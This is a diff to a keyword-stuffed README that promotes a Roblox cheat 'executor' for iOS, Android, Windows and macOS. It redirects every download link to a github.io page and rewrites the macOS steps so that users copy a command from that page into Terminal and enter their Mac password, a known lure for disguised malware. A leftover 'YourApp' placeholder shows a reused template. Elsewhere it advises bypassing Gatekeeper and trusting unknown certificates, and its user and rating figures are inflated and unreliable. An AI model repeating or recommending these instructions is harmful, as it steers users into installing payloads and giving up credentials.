@@ -1,6 +1,6 @@
 # Ronix Executor - Download The Best Roblox Executor 2026
 
-![Downloads](https://img.shields.io/badge/Downloads-880K+-blue?style=for-the-badge&logo=github)
+![Downloads](https://img.shields.io/badge/Downloads-2.4M+-blue?style=for-the-badge&logo=github)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.9%2F5-gold?style=for-the-badge&logo=star)
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-12.4-green?style=for-the-badge&logo=github)
 ![License](https://img.shields.io/badge/License-MIT-purple?style=for-the-badge)
@@ -9,11 +9,11 @@ Welcome to **Ronix Executor**, the most powerful and reliable Roblox script exec
 
 <div align="center">
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 </div> 
 
-<img width="1280" height="675" alt="image" src="https://github.com/user-attachments/assets/f1fc017c-7c51-482f-8e78-58bbe8396563" />
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/f1fc017c-7c51-482f-8e78-58bbe8396563" />
 
 The **ronix executor** version revolutionizes mobile scripting with **ronix executor direct install ios** functionality, eliminating complicated sideloading procedures. The **ronix executor ios ipad** compatibility ensures tablet users enjoy identical premium features. For desktop users, the **ronix executor windows** platform offers lightning-fast injection and advanced debugging tools. The **ronix executor roblox 99 nights** optimization demonstrates our commitment to game-specific performance enhancements.
 
@@ -53,7 +53,7 @@ The **ronix executor direct install ios 2026** method revolutionizes mobile scri
 
 Community support through the **ronix executor discord** ensures comprehensive assistance. With 600K+ active members, 24/7 moderation, dedicated support tickets, and exclusive beta access, you're joining the most professional executor community available. The **ronix executor ipad** and iOS channels provide platform-specific expertise that general forums can't deliver.
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 ## Benefits
 
@@ -92,7 +92,7 @@ Community support through the **ronix executor discord** ensures comprehensive a
 9. Load scripts from the hub or paste custom code
 10. Tap "Execute" to run scripts on your **ronix executor ios ipad**
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 **Installation Time:** Under 60 seconds for complete **ronix executor direct install ipa** setup
 
@@ -105,7 +105,7 @@ Community support through the **ronix executor discord** ensures comprehensive a
 5. Trust the certificate on your device
 6. Follow injection steps from Method 1
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 **Note:** The **ronix executor apple** direct install method is significantly easier and provides 365-day certificate validity versus 7-day sideloading limitations.
 
@@ -120,7 +120,7 @@ Community support through the **ronix executor discord** ensures comprehensive a
 7. Load scripts from the hub or paste custom code
 8. Click "Execute" to run scripts
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 ### Android Installation
 
@@ -132,17 +132,18 @@ Community support through the **ronix executor discord** ensures comprehensive a
 6. Tap the floating ronix icon to open the executor
 7. Select or paste your script and tap "Execute"
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 ### macOS Installation
 
-1. Download the **ronix executor download** macOS version
-2. Extract the DMG file and drag ronix to Applications
-3. Right-click and select "Open" to bypass Gatekeeper
-4. Follow the same injection process as **ronix executor windows**
-5. Join **ronix executor discord** for macOS-specific support
+1. Hit the **Download** to open the Installer and **copy** the command line.
+2. Press `Cmd + Space` on your keyboard, type **"Terminal"** into Spotlight, and hit **Enter**.
+3. Click inside the Terminal window, **paste** the command you copied, and press **Enter**.
+4. Type your **Mac password** when prompted. 
+5. Press **Enter** one last time to begin the installation process.
+6. Once the process finishes, **YourApp** will be available in your **Applications** folder.
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 ## Compatibility
 
@@ -220,11 +221,11 @@ The **ronix executor for ios** maintains exceptional efficiency, using less than
 
 🔒 **Protect Installation Files** – Only download **ronix executor for ios** from official sources
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
 
 ## FAQ
 
-### Is ronix Executor completely free?
+### Is ronix executor completely free?
 
 Yes! The **ronix executor download** is completely free with full functionality across all platforms. Unlike premium executors charging subscriptions, **ronix executor for ios**, **ronix executor windows**, and mobile versions provide unlimited access without fees.
 
@@ -262,4 +263,4 @@ Join the revolution in mobile and desktop scripting. **ronix executor download**
 
 **Ready to elevate your Roblox experience? Click the download button above and join 2.4M+ users!**
 
-[![Download ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://tinyurl.com/mvkuw8t3?ronix)
+[![Download Ronix Executor](https://img.shields.io/badge/Download%20ronix%20Executor-red?style=for-the-badge&logo=github)](https://ronix-devop.github.io/ronix/)
